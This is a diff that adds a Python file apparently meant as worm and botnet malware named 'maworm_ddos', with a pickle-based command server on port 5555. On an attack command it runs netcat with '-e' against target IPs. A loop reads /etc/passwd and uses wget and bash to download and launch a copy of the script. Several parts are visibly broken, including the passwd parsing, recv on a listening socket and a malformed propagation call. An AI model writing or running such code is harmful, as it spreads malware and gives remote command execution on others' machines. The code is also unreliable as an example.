@@ -1,0 +1,88 @@
+import os
+import socket
+import threading
+import subprocess
+import time
+import pickle
+
+class ServerThread(threading.Thread):
+    def __init__(self, s):
+        threading.Thread.__init__(self)
+        self.s = s
+
+    def run(self):
+        while True:
+            try:
+                data = self.s.recv(1024)
+                cmd, _ = pickle.loads(data)
+                if cmd == "COM_CONNECT":
+                    self.handle_connect()
+                elif cmd == "COM_DISCONNECT":
+                    self.handle_disconnect()
+                elif cmd == "COM_ATTACK":
+                    self.handle_attack()
+            except Exception as e:
+                print(e)
+                self.s.close()
+                break
+
+    def handle_connect(self):
+        print("Client {} connected".format(self.s.getpeername()))
+        self.s.send(pickle.dumps(("ACK_CONNECT", )))
+        ServerThread(self.s).start()
+
+    def handle_disconnect(self):
+        self.s.close()
+        print("Client {} disconnected".format(self.s.getpeername()))
+
+    def handle_attack(self):
+        target_ips = {"target_ips"}  # replace this line with the list of target IPs
+        for command in {"shell_commands"}:  # replace this line with the list of shell commands
+            for target_ip in target_ips:
+                command_ip = "{}.{}".format(target_ip.split('.')[0], str(int(target_ip.split('.')[3]) + 1)) if len(target_ip.split('.')) == 4 else target_ip
+                spine = ['nc', target_ip, str(5555), '-e', command]
+                subprocess.call(spine)
+                time.sleep(3)
+        self.s.send(pickle.dumps(("ACK_ATTACK", )))
+
+def have_ssh(ip):
+    try:
+        s = socket.create_connection((ip, 22))
+        s.close()
+        return True
+    except OSError:
+        return False
+
+def propagate(ip):
+    spine = ['/tmp/maworm_ddos.py', 'python', '/tmp/maworm_ddos.py', '{}'.format(ip)]
+    subprocess.call(spine)
+
+def main():
+    me = socket.gethostbyname(socket.getfqdn())
+    print("Launching server on port 5555...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('', 5555))
+    s.listen(5)
+    print("Listening for incoming connections...")
+    ServerThread(s).start()
+
+    while True:
+        with open('/etc/passwd', 'r') as passwdfile:
+            lines = [line.strip() for line in passwdfile.readlines()]
+            for line in lines:
+                user, _, home = line.split()
+                if not user.endswith('root'):
+                    continue
+                home = home.strip()
+                if not os.path.isdir(home):
+                    continue
+                if have_ssh(me):
+                    spine = ['/bin/bash', '-c', 'cd {}; wget -O /tmp/maworm_ddos.py https://{}/maworm_ddos.py; python /tmp/maworm_ddos.py'.format(home, me)]
+                    subprocess.call(spine)
+                    spine = ['/bin/bash', '-c', 'cd {}; /tmp/maworm_ddos.py &'.format(home)]
+                    subprocess.call(spine)
+                time.sleep(1)
+
+if __name__ == '__main__':
+    main()
